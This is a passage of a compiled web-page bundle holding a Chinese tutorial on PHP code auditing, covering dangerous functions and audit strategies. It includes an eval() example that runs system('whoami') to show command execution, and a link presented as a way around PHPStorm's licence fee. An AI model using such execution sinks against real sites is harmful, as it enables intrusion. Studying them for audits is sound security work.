"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[6293],{3538:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>t,default:()=>p,frontMatter:()=>c,metadata:()=>l,toc:()=>d});const l=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/PHP/PHP\u4ee3\u7801\u5ba1\u8ba1","title":"PHP\u4ee3\u7801\u5ba1\u8ba1","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/02.PHP/02.PHP\u4ee3\u7801\u5ba1\u8ba1.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/02.PHP","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/PHP/PHP\u4ee3\u7801\u5ba1\u8ba1","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/PHP/PHP\u4ee3\u7801\u5ba1\u8ba1","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/02.PHP/02.PHP\u4ee3\u7801\u5ba1\u8ba1.md","tags":[],"version":"current","sidebarPosition":2,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"PHP\u4ee3\u7801\u5ba1\u8ba1\u57fa\u7840\u77e5\u8bc6","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/PHP/PHP\u4ee3\u7801\u5ba1\u8ba1\u57fa\u7840\u77e5\u8bc6"},"next":{"title":"\u8bb0\u5f55\u4e00\u6b21\u5bf9PHAR\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/PHP/\u8bb0\u5f55\u4e00\u6b21\u5bf9PHAR\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528"}}');var r=s(4848),i=s(8453);const c={},t="PHP\u4ee3\u7801\u5ba1\u8ba1",a={},d=[{value:"\u5e8f\u8a00",id:"\u5e8f\u8a00",level:2},{value:"\u5de5\u5177\u51c6\u5907",id:"\u5de5\u5177\u51c6\u5907",level:2},{value:"PHPStorm",id:"phpstorm",level:3},{value:"VScode",id:"vscode",level:3},{value:"\u5ba1\u8ba1\u601d\u8def",id:"\u5ba1\u8ba1\u601d\u8def",level:2},{value:"\u654f\u611f\u51fd\u6570\u65b9\u6cd5\u56de\u6eaf(\u53cd\u5411\u5ba1\u8ba1)",id:"\u654f\u611f\u51fd\u6570\u65b9\u6cd5\u56de\u6eaf\u53cd\u5411\u5ba1\u8ba1",level:3},{value:"\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8ffd\u8e2a(\u6b63\u5411\u5ba1\u8ba1)",id:"\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8ffd\u8e2a\u6b63\u5411\u5ba1\u8ba1",level:3},{value:"\u5173\u952e\u4e1a\u52a1\u529f\u80fd\u5206\u6790(\u529f\u80fd\u5ba1\u8ba1)",id:"\u5173\u952e\u4e1a\u52a1\u529f\u80fd\u5206\u6790\u529f\u80fd\u5ba1\u8ba1",level:3},{value:"\u5b8c\u5168\u5ba1\u8ba1\u6e90\u4ee3\u7801",id:"\u5b8c\u5168\u5ba1\u8ba1\u6e90\u4ee3\u7801",level:3},{value:"\u57fa\u7840\u77e5\u8bc6",id:"\u57fa\u7840\u77e5\u8bc6",level:2},{value:"\u524d\u8a00",id:"\u524d\u8a00",level:3},{value:"\u4ee3\u7801\u6267\u884c",id:"\u4ee3\u7801\u6267\u884c",level:3},{value:"eval()",id:"eval",level:4},{value:"\u8fd4\u56de\u503c",id:"\u8fd4\u56de\u503c",level:5},{value:"assert()",id:"assert",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570",level:5},{value:"assert()\u914d\u7f6e",id:"assert\u914d\u7f6e",level:5},{value:"preg_replace()",id:"preg_replace",level:4},{value:"\u53c2\u6570\u8bf4\u660e\uff1a",id:"\u53c2\u6570\u8bf4\u660e",level:5},{value:"create_function()",id:"create_function",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-1",level:5},{value:"\u8fd4\u56de\u503c",id:"\u8fd4\u56de\u503c-1",level:5},{value:"array_map()",id:"array_map",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-2",level:5},{value:"\u8fd4\u56de\u503c",id:"\u8fd4\u56de\u503c-2",level:5},{value:"call_user_func()",id:"call_user_func",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-3",level:5},{value:"call_user_func_array()",id:"call_user_func_array",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-4",level:5},{value:"array_filter()",id:"array_filter",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-5",level:5},{value:"usort()",id:"usort",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-6",level:5},{value:"uasort()",id:"uasort",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-7",level:5},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:4},{value:"\u547d\u4ee4\u6267\u884c",id:"\u547d\u4ee4\u6267\u884c",level:3},{value:"system()",id:"system",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-8",level:5},{value:"exec()",id:"exec",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-9",level:5},{value:"shell_exec()",id:"shell_exec",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-10",level:5},{value:"passthru()",id:"passthru",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-11",level:5},{value:"pcntl_exec()",id:"pcntl_exec",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-12",level:5},{value:"popen()",id:"popen",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-13",level:5},{value:"proc_open()",id:"proc_open",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-14",level:5},{value:"\u6587\u4ef6\u5305\u542b",id:"\u6587\u4ef6\u5305\u542b",level:3},{value:"include()",id:"include",level:4},{value:"include_once()",id:"include_once",level:4},{value:"require()",id:"require",level:4},{value:"require_once()",id:"require_once",level:4},{value:"\u603b\u7ed3",id:"\u603b\u7ed3-1",level:4},{value:"\u6587\u4ef6\u8bfb\u53d6(\u4e0b\u8f7d)",id:"\u6587\u4ef6\u8bfb\u53d6\u4e0b\u8f7d",level:3},{value:"file_get_contents()",id:"file_get_contents",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-15",level:5},{value:"fopen()",id:"fopen",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-16",level:5},{value:"fread()",id:"fread",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-17",level:5},{value:"fgets()",id:"fgets",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-18",level:5},{value:"fgetss()",id:"fgetss",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-19",level:5},{value:"readfile()",id:"readfile",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-20",level:5},{value:"file()",id:"file",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-21",level:5},{value:"parse_ini_file()",id:"parse_ini_file",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-22",level:5},{value:"show_source()/highlight_file()",id:"show_sourcehighlight_file",level:4},{value:"\u603b\u7ed3",id:"\u603b\u7ed3-2",level:4},{value:"\u6587\u4ef6\u4e0a\u4f20",id:"\u6587\u4ef6\u4e0a\u4f20",level:3},{value:"move_uploaded_file()",id:"move_uploaded_file",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-23",level:5},{value:"\u6587\u4ef6\u5220\u9664",id:"\u6587\u4ef6\u5220\u9664",level:3},{value:"unlink()",id:"unlink",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-24",level:5},{value:"session_destroy()",id:"session_destroy",level:4},{value:"\u53d8\u91cf\u8986\u76d6",id:"\u53d8\u91cf\u8986\u76d6",level:3},{value:"extract()",id:"extract",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-25",level:5},{value:"parse_str()",id:"parse_str",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-26",level:5},{value:"import_request_variables()",id:"import_request_variables",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-27",level:5},{value:"foreach()",id:"foreach",level:4},{value:"\u5f31\u7c7b\u578b\u6bd4\u8f83",id:"\u5f31\u7c7b\u578b\u6bd4\u8f83",level:3},{value:"md5()\u51fd\u6570\u548csha1()\u7ed5\u8fc7",id:"md5\u51fd\u6570\u548csha1\u7ed5\u8fc7",level:4},{value:"is_numeric()\u7ed5\u8fc7",id:"is_numeric\u7ed5\u8fc7",level:4},{value:"in_array()\u7ed5\u8fc7",id:"in_array\u7ed5\u8fc7",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-28",level:5},{value:"XSS",id:"xss",level:3},{value:"print()",id:"print",level:4},{value:"print_r()",id:"print_r",level:4},{value:"echo()",id:"echo",level:4},{value:"printf()",id:"printf",level:4},{value:"sprintf()",id:"sprintf",level:4},{value:"die()",id:"die",level:4},{value:"var_dump()",id:"var_dump",level:4},{value:"var_export()",id:"var_export",level:4},{value:"PHP\u9ed1\u9b54\u6cd5",id:"php\u9ed1\u9b54\u6cd5",level:3},{value:"md5()",id:"md5",level:4},{value:"eval()",id:"eval-1",level:4},{value:"ereg()",id:"ereg",level:4},{value:"strcmp()",id:"strcmp",level:4},{value:"curl_setopt()",id:"curl_setopt",level:4},{value:"preg_replace()",id:"preg_replace-1",level:4},{value:"urldecode()",id:"urldecode",level:4},{value:"file_get_contents()",id:"file_get_contents-1",level:4},{value:"parse_url()",id:"parse_url",level:4},{value:"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e",id:"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e",level:3},{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb",level:4},{value:"__wakeup()",id:"__wakeup",level:4},{value:"__sleep()",id:"__sleep",level:4},{value:"__destruct()",id:"__destruct",level:4},{value:"__construct()",id:"__construct",level:4},{value:"__call()",id:"__call",level:4},{value:"__callStatic()",id:"__callstatic",level:4},{value:"__get()",id:"__get",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-29",level:5},{value:"__set()",id:"__set",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-30",level:5},{value:"__isset()",id:"__isset",level:4},{value:"__unset()",id:"__unset",level:4},{value:"__toString()",id:"__tostring",level:4},{value:"__invoke()",id:"__invoke",level:4},{value:"pop\u94fe\u7684\u6784\u9020",id:"pop\u94fe\u7684\u6784\u9020",level:4},{value:"\u601d\u8def",id:"\u601d\u8def",level:4},{value:"phar\u4e0e\u53cd\u5e8f\u5217\u5316",id:"phar\u4e0e\u53cd\u5e8f\u5217\u5316",level:4},{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb-1",level:5},{value:"\u6587\u4ef6\u7ed3\u6784",id:"\u6587\u4ef6\u7ed3\u6784",level:5},{value:"\u5b9e\u9a8c",id:"\u5b9e\u9a8c",level:5},{value:"phar.php\uff1a",id:"pharphp",level:6},{value:"Ameng.php",id:"amengphp",level:6},{value:"\u5176\u4ed6\u4e00\u4e9b\u603b\u7ed3",id:"\u5176\u4ed6\u4e00\u4e9b\u603b\u7ed3",level:3},{value:"basename()",id:"basename",level:4},{value:"\u53c2\u6570",id:"\u53c2\u6570-31",level:5},{value:"\u5b9e\u6218\u9879\u76ee",id:"\u5b9e\u6218\u9879\u76ee",level:2},{value:"\u4efb\u5b50\u884c\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf(PHP)",id:"\u4efb\u5b50\u884c\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edfphp",level:3},{value:"\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf(PHP\u3001Python)",id:"\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edfphppython",level:3}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",h5:"h5",h6:"h6",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,r.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,r.jsx)(n.tbody,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{style:{textAlign:"left"},children:(0,r.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,r.jsx)(n.td,{style:{textAlign:"left"},children:"2025-08-19 16:48:43"})]})})]}),"\n",(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"php\u4ee3\u7801\u5ba1\u8ba1",children:"PHP\u4ee3\u7801\u5ba1\u8ba1"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5e8f\u8a00",children:"\u5e8f\u8a00"}),"\n",(0,r.jsx)(n.p,{children:"PHP\u4ee3\u7801\u5ba1\u8ba1\u662f\u6307\u5bf9PHP\u7a0b\u5e8f\u6e90\u4ee3\u7801\u8fdb\u884c\u7cfb\u7edf\u6027\u7684\u68c0\u67e5,\u5b83\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u53d1\u73b0PHP\u7a0b\u5e8f\u5b58\u5728\u7684\u4e00\u4e9b\u6f0f\u6d1e\u6216\u8005\u903b\u8f91\u95ee\u9898,\u907f\u514d\u7a0b\u5e8f\u7f3a\u9677\u88ab\u975e\u6cd5\u5229\u7528\u4ece\u800c\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u5b89\u5168\u98ce\u9669."}),"\n",(0,r.jsx)(n.h2,{id:"\u5de5\u5177\u51c6\u5907",children:"\u5de5\u5177\u51c6\u5907"}),"\n",(0,r.jsx)(n.h3,{id:"phpstorm",children:"PHPStorm"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://www.jetbrains.com/phpstorm/promo/?source=google&medium=cpc&campaign=APAC_en_ASIA_PhpStorm_Branded&term=phpstorm&content=604024580598&gad_source=1&gclid=CjwKCAjw3P-2BhAEEiwA3yPhwA6dzuksQ-yrsGvjWnSHA7FZl5cFJK_Y5szv4KhVm8XmThiwRB9vvxoC_o4QAvD_BwE",children:"PHPStorm"})," \u662f JetBrains \u516c\u53f8\u5f00\u53d1\u7684\u4e00\u6b3e\u5546\u4e1a\u7684PHP\u96c6\u6210\u5f00\u53d1\u5de5\u5177\uff0c\u65e8\u5728\u63d0\u9ad8\u7528\u6237\u6548\u7387\uff0c\u53ef\u6df1\u523b\u7406\u89e3\u7528\u6237\u7684\u7f16\u7801\uff0c\u63d0\u4f9b\u667a\u80fd\u4ee3\u7801\u8865\u5168\uff0c\u5feb\u901f\u5bfc\u822a\u4ee5\u53ca\u5373\u65f6\u9519\u8bef\u68c0\u67e5"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"\u4f18\u70b9"}),": \u597d\u7528"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"\u7f3a\u70b9"}),": \u8981\u94b1 ",(0,r.jsx)(n.a,{href:"https://3.jetbra.in/",children:"\u795e\u79d8\u5de5\u5177"})]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"vscode",children:"VScode"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://code.visualstudio.com/",children:"Visual Studio Code"})," \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u4f46\u529f\u80fd\u5f3a\u5927\u7684\u6e90\u4ee3\u7801\u7f16\u8f91\u5668\uff0c\u53ef\u5728\u684c\u9762\u4e0a\u8fd0\u884c\uff0c\u9002\u7528\u4e8e Windows\u3001macOS \u548c Linux\u3002\u5b83\u5185\u7f6e\u4e86\u5bf9 JavaScript\u3001TypeScript \u548c Node.js \u7684\u652f\u6301\uff0c\u5e76\u5177\u6709\u9002\u7528\u4e8e\u5176\u4ed6\u8bed\u8a00\u548c\u8fd0\u884c\u65f6\uff08\u5982 C++\u3001C#\u3001Java\u3001Python\u3001PHP\u3001Go\u3001.NET\uff09\u7684\u4e30\u5bcc\u6269\u5c55\u751f\u6001\u7cfb\u7edf"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"**\u4f18\u70b9\uff1a**\u514d\u8d39 \u9002\u914d\u5ea6\u9ad8"}),"\n",(0,r.jsx)(n.li,{children:"**\u7f3a\u70b9\uff1a**\u73af\u5883\u914d\u7f6e\u9ebb\u70e6"}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"\u5ba1\u8ba1\u601d\u8def",children:"\u5ba1\u8ba1\u601d\u8def"}),"\n",(0,r.jsx)(n.h3,{id:"\u654f\u611f\u51fd\u6570\u65b9\u6cd5\u56de\u6eaf\u53cd\u5411\u5ba1\u8ba1",children:"\u654f\u611f\u51fd\u6570\u65b9\u6cd5\u56de\u6eaf(\u53cd\u5411\u5ba1\u8ba1)"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u627e\u9879\u76ee\u4e2d\u7684\u654f\u611f\u51fd\u6570\u65b9\u6cd5 \u56de\u6eaf\u4f20\u5165\u7684\u53c2\u6570 \u5224\u65ad\u7528\u6237\u662f\u5426\u53ef\u63a7 \u662f\u5426\u5f97\u5230\u6709\u6548\u7684\u8fc7\u6ee4"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"\u7f3a\u70b9"}),":\u5f88\u96be\u53d1\u73b0\u8d8a\u6743\u7b49\u903b\u8f91\u6f0f\u6d1e"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8ffd\u8e2a\u6b63\u5411\u5ba1\u8ba1",children:"\u7528\u6237\u53ef\u63a7\u53c2\u6570\u8ffd\u8e2a(\u6b63\u5411\u5ba1\u8ba1)"}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u627e\u9879\u76ee\u4e2d\u7684\u7528\u6237\u8f93\u5165 \u8ffd\u8e2a\u7528\u6237\u8f93\u5165  \u5224\u65ad\u662f\u5426\u5f97\u5230\u6709\u6548\u7684\u8fc7\u6ee4/\u8c03\u7528\u654f\u611f\u51fd\u6570/\u5b58\u5728\u903b\u8f91\u95ee\u9898"}),"\n",(0,r.jsx)(n.h3,{id:"\u5173\u952e\u4e1a\u52a1\u529f\u80fd\u5206\u6790\u529f\u80fd\u5ba1\u8ba1",children:"\u5173\u952e\u4e1a\u52a1\u529f\u80fd\u5206\u6790(\u529f\u80fd\u5ba1\u8ba1)"}),"\n",(0,r.jsx)(n.p,{children:"\u4e13\u95e8\u5ba1\u8ba1\u6613\u51fa\u73b0\u6f0f\u6d1e\u7684\u5173\u952e\u529f\u80fd\u70b9\uff0c\u5982 \u5934\u50cf\u4e0a\u4f20 \u7cfb\u7edf\u767b\u9646 \u6587\u4ef6\u4e0b\u8f7d \u7b49\u529f\u80fd"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"**\u4f18\u70b9:**\u53ef\u4ee5\u5feb\u901f\u5b8c\u6210\u5ba1\u8ba1 \u51cf\u5c11\u5ba1\u8ba1\u9762 \u53ef\u53d1\u73b0\u8d8a\u6743\u7b49\u903b\u8f91\u6f0f\u6d1e"}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"**\u7f3a\u70b9:**\u5ba1\u8ba1\u4e0d\u5b8c\u5168\uff0c\u96be\u4ee5\u53d1\u73b0\u6846\u67b6\u6f0f\u6d1e"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u5b8c\u5168\u5ba1\u8ba1\u6e90\u4ee3\u7801",children:"\u5b8c\u5168\u5ba1\u8ba1\u6e90\u4ee3\u7801"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"**\u4f18\u70b9:**\u5b8c\u5168\u8986\u76d6\u6e90\u4ee3\u7801 \u53ef\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u6761\u4ef6\u7684\u6f0f\u6d1e"}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"**\u7f3a\u70b9:**\u8017\u65f6\u957f \u5bb9\u6613\u9057\u6f0f"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"\u57fa\u7840\u77e5\u8bc6",children:"\u57fa\u7840\u77e5\u8bc6"}),"\n",(0,r.jsx)(n.h3,{id:"\u524d\u8a00",children:"\u524d\u8a00"}),"\n",(0,r.jsx)(n.p,{children:"\u672c\u6587\u7ae0\u4e3b\u8981\u662fPHP\u4ee3\u7801\u5ba1\u8ba1\u7684\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\uff0c\u5305\u62ec\u51fd\u6570\u7684\u7528\u6cd5\uff0c\u6f0f\u6d1e\u70b9\uff0c\u504f\u5411\u57fa\u7840\u90e8\u5206\uff0c\u4e2a\u4eba\u80fd\u529b\u6709\u9650\uff0c\u90e8\u5206\u53ef\u80fd\u4f1a\u51fa\u73b0\u9519\u8bef\u6216\u8005\u9057\u6f0f\uff0c\u8bfb\u8005\u53ef\u81ea\u884c\u8865\u5145\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u4ee3\u7801\u6267\u884c",children:"\u4ee3\u7801\u6267\u884c"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u6267\u884c\u662f\u4ee3\u7801\u5ba1\u8ba1\u5f53\u4e2d\u8f83\u4e3a\u4e25\u91cd\u7684\u6f0f\u6d1e\uff0c\u4e3b\u8981\u662f\u4e00\u4e9b\u547d\u4ee4\u6267\u884c\u51fd\u6570\u7684\u4e0d\u9002\u5f53\u4f7f\u7528\u3002\u90a3\u4e48\uff0c\u5e38\u89c1\u7684\u80fd\u591f\u89e6\u53d1\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u51fd\u6570\u6709\u54ea\u4e9b\u5462\uff1f"}),"\n",(0,r.jsx)(n.h4,{id:"eval",children:"eval()"}),"\n",(0,r.jsxs)(n.p,{children:["\u60f3\u5fc5\u5927\u5bb6\u5bf9",(0,r.jsx)(n.code,{children:"eval()"}),"\u51fd\u6570\u5e94\u8be5\u5e76\u4e0d\u964c\u751f\uff0c\u7b80\u800c\u8a00\u4e4b",(0,r.jsx)(n.code,{children:"eval()"}),"\u51fd\u6570\u5c31\u662f\u5c06\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u5f53\u4f5c ",(0,r.jsx)(n.code,{children:"PHP"})," \u4ee3\u7801\u6765\u8fdb\u884c\u6267\u884c\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"eval( string $code) : mixed\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u8fd4\u56de\u503c",children:"\u8fd4\u56de\u503c"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"eval()"})," \u8fd4\u56de ",(0,r.jsx)(n.code,{children:"NULL"}),"\uff0c\u9664\u975e\u5728\u6267\u884c\u7684\u4ee3\u7801\u4e2d return\u4e86\u4e00\u4e2a\u503c\uff0c\u51fd\u6570\u8fd4\u56de\u4f20\u9012\u7ed9 return\u7684\u503c\u3002PHP7\u5f00\u59cb\uff0c\u6267\u884c\u7684\u4ee3\u7801\u91cc\u5982\u679c\u6709\u4e00\u4e2aparse error\uff0c",(0,r.jsx)(n.code,{children:"eval()"})," \u4f1a\u629b\u51fa ParseError \u5f02\u5e38\u3002\u5728 PHP 7 \u4e4b\u524d\uff0c\u5982\u679c\u5728\u6267\u884c\u7684\u4ee3\u7801\u4e2d\u6709 parse error\uff0c",(0,r.jsx)(n.code,{children:"eval()"})," \u8fd4\u56de",(0,r.jsx)(n.code,{children:"FALSE"}),"\uff0c\u4e4b\u540e\u7684\u4ee3\u7801\u5c06\u6b63\u5e38\u6267\u884c\u3002\u65e0\u6cd5\u4f7f\u7528",(0,r.jsx)(n.code,{children:"set_error_handler()"}),"\u6355\u83b7 ",(0,r.jsx)(n.code,{children:"eval()"})," \u4e2d\u7684\u89e3\u6790\u9519\u8bef\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5728\u5229\u7528",(0,r.jsx)(n.code,{children:"eval()"}),"\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5982\u679c\u6211\u4eec\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u662f\u6b63\u5e38\u7684\u4ee3\u7801\u683c\u5f0f\uff0c\u90a3\u4e48\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6240\u4ee5PHP7\u548cPHP5\u5728\u8fd9\u90e8\u5206\u6700\u5927\u7684\u4e0d\u540c\u662f\u4ec0\u4e48\u5462\uff1f\u7b80\u800c\u8a00\u4e4b\uff0cPHP5\u5728\u4ee3\u7801\u9519\u8bef\u683c\u5f0f\u9519\u8bef\u4e4b\u540e\u4ecd\u4f1a\u6267\u884c\uff0c\u800cPHP7\u5728\u4ee3\u7801\u53d1\u751f\u9519\u8bef\u4e4b\u540e\uff0c\u90a3\u4e48",(0,r.jsx)(n.code,{children:"eval()"}),"\u51fd\u6570\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4e0d\u6267\u884c\u4e4b\u540e\u7684\u4ee3\u7801\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $code = \"echo 'This is a PHP7';\";\n    eval($code);\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>This is a PHP```\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u8981\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5462\uff1f\u8fd9\u4e2a\u65f6\u5019\u5c31\u9700\u8981\u7528\u5230PHP\u4e2d\u7684`system`\u51fd\u6570\u3002\n\n```php\n<?php\n    $code = \"system('whoami');\";\n    eval($code);\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>desktop-m61j5j6\\admin\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u5230\u6b64\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7ed3\u5408\u5176\u4ed6\u59ff\u52bf\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e86\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"assert",children:"assert()"}),"\n",(0,r.jsx)(n.p,{children:"PHP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"assert( mixed $assertion[, string $description] ) : bool\n"})}),"\n",(0,r.jsx)(n.p,{children:"PHP"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"assert( mixed $assertion[, Throwable $exception] ) : bool\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"assertion"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u65ad\u8a00\u3002\u5728PHP 5 \u4e2d\uff0c\u662f\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u7684\u5b57\u7b26\u4e32\u6216\u8005\u7528\u4e8e\u6d4b\u8bd5\u7684\u5e03\u5c14\u503c\u3002\u5728PHP 7 